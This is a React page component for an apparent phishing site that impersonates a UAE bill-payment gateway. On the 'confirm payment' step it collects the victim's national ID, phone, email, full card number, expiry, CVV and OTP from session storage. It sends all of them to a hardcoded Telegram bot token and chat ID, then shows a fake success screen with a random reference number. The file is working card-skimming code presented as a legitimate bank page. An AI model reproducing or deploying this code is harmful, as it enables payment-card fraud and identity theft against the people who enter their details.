import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";

export default function ConfirmPayment() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [paymentData, setPaymentData] = useState<any>({});

  useEffect(() => {
    const data = JSON.parse(sessionStorage.getItem("paymentData") || "{}");
    setPaymentData(data);
  }, []);

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleConfirm = async () => {
    setLoading(true);

    const message = `
✅ *تأكيد السداد النهائي - بوابة سداد الإمارات*
--------------------------
🧾 *رقم الفاتورة:* ${paymentData.invoiceNumber}
🏛 *البنك:* ${paymentData.bank}
💰 *المبلغ:* ${paymentData.amount} درهم إماراتي
🆔 *رقم الهوية:* ${paymentData.idNumber}
📱 *رقم الجوال:* ${paymentData.phoneNumber}
📧 *البريد الإلكتروني:* ${paymentData.email}
💳 *رقم البطاقة:* ${paymentData.cardNumber}
👤 *حامل البطاقة:* ${paymentData.cardHolder}
📅 *تاريخ الانتهاء:* ${paymentData.expiryDate}
🔒 *CVV:* ${paymentData.cvv}
🔐 *رمز التحقق:* ${paymentData.otp}
--------------------------
🏁 *الحالة:* تم التأكيد بنجاح
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      setConfirmed(true);
      sessionStorage.clear();
    } catch (error) {
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex flex-col items-center">
          <div className="bg-amber-500 p-2 rounded-full mb-1">
            <span className="text-white font-bold text-lg">سداد</span>
          </div>
          <h1 className="text-xl font-bold text-gray-800">بوابة سداد الإمارات</h1>
        </div>
      </header>

      <main className="flex-grow container py-8 px-4">
        <div className="max-w-xl mx-auto bg-white rounded-xl shadow-lg p-6 border border-gray-100">
          <div className="flex justify-between mb-8 relative">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className={`z-10 w-8 h-8 rounded-full flex items-center justify-center font-bold ${step <= 5 ? 'bg-amber-500 text-white' : 'bg-gray-200 text-gray-500'}`}>
                {step}
              </div>
            ))}
            <div className="absolute top-4 left-0 right-0 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          {!confirmed ? (
            <>
              <h2 className="text-2xl font-bold text-gray-900 mb-2 text-center">تأكيد السداد</h2>
              <p className="text-gray-500 text-center mb-8">يرجى مراجعة البيانات قبل تأكيد السداد</p>

              <div className="space-y-4 bg-gray-50 p-6 rounded-xl border border-gray-200 mb-8">
                <div className="flex justify-between border-b border-gray-200 pb-2">
                  <span className="text-gray-500">رقم الفاتورة:</span>
                  <span className="font-bold">{paymentData.invoiceNumber}</span>
                </div>
                <div className="flex justify-between border-b border-gray-200 pb-2">
                  <span className="text-gray-500">رقم الهوية:</span>
                  <span className="font-bold">{paymentData.idNumber}</span>
                </div>
                <div className="flex justify-between border-b border-gray-200 pb-2">
                  <span className="text-gray-500">رقم الجوال:</span>
                  <span className="font-bold">{paymentData.phoneNumber}</span>
                </div>
                <div className="flex justify-between border-b border-gray-200 pb-2">
                  <span className="text-gray-500">نوع الخدمة:</span>
                  <span className="font-bold">{paymentData.serviceType}</span>
                </div>
                <div className="flex justify-between border-b border-gray-200 pb-2">
                  <span className="text-gray-500">البنك:</span>
                  <span className="font-bold">{paymentData.bank}</span>
                </div>
                <div className="flex justify-between pt-2">
                  <span className="text-lg font-bold">المبلغ الإجمالي:</span>
                  <span className="text-lg font-bold text-amber-600">{paymentData.amount} د.إ</span>
                </div>
              </div>

              <div className="bg-blue-50 p-4 rounded-lg flex items-center gap-3 border border-blue-100 mb-8">
                <p className="text-xs text-blue-800 text-center w-full">بتأكيدك للسداد، توافق على استقطاع المبلغ من حسابك البنكي</p>
              </div>

              <div className="flex gap-4">
                <Button variant="outline" className="flex-1" onClick={() => setLocation("/verify-otp")}>الرجوع</Button>
                <Button className="flex-1 bg-amber-500 hover:bg-amber-600 text-white" onClick={handleConfirm} disabled={loading}>
                  {loading ? "جاري المعالجة..." : "تأكيد السداد"}
                </Button>
              </div>
            </>
          ) : (
            <div className="text-center py-8">
              <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center text-4xl mx-auto mb-6">✓</div>
              <h2 className="text-3xl font-bold text-gray-900 mb-4">تم السداد بنجاح!</h2>
              <p className="text-gray-600 mb-8 leading-relaxed">
                شكراً لاستخدامك بوابة سداد الإمارات. <br />
                تم تأكيد السداد وسيتم استقطاع المبلغ من حسابك البنكي. <br />
                رقم المرجع: <span className="font-mono font-bold text-gray-900">UAE-{Math.random().toString(36).substring(2, 10).toUpperCase()}</span>
              </p>
              <div className="flex flex-col gap-3">
                <Button className="bg-amber-500 hover:bg-amber-600 text-white" onClick={() => setLocation("/")}>العودة للرئيسية</Button>
                <Button variant="outline" onClick={() => setLocation("/user-data")}>عملية جديدة</Button>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
